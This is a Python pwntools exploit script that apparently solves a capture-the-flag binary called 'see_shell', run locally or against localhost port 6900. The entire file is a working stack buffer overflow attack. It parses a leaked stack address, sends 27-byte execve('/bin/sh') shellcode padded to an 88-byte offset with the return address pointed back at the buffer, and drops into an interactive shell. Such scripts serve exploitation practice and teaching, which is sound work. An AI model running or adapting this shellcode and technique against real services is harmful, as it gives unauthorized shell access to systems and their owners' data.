#!/usr/bin/env python3.8

from pwn import *
import warnings
import re

# Allows you to switch between local/GDB/remote from terminal
def connect():
    if args.GDB:
        r = gdb.debug(elf.path, gdbscript=gdbscript)
    elif args.REMOTE:
        r = remote("localhost", 6900)
    else:
        r = process([elf.path])
    return r

# Specify GDB script here (breakpoints etc)
gdbscript = """
    set follow-fork-mode child
    start
    b *main+205
"""

# Binary filename
exe = './see_shell'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# =======================
# EXPLOIT AFTER THIS
# =======================
r = connect()

offset = 88
sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

print(r.recvline().decode())
resp = r.recvline().decode().rstrip()
resp = resp.split(" ")[7]
stack_buf_addr = int(resp, 16)
print(f"stack buffer address: {hex(stack_buf_addr)}")

print(r.recvline().decode())
payload = sc
payload += b"A" * (offset - len(sc))
payload += p64(stack_buf_addr)
r.sendline(payload)


r.interactive()